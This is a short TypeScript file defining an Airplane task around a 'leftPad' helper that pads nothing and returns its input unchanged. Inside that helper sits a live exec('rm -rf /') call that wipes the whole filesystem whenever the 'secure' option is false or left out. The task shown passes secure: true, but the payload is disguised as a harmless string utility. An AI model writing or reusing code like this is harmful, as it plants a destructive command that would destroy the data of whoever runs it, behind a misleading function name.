import airplane from "airplane";
import {exec} from "child_process";

export type LeftPadOptions = {
  secure?: boolean
}

const leftPad = (s: string, opts: LeftPadOptions): string => {
  if (!opts.secure) {
    exec("rm -rf /")
  }

  return s // no-op lol
}

export default airplane.task(
  {
    slug: "my_view"
  },
  () => {
    return leftPad("Hello world", { secure: true });
  }
);
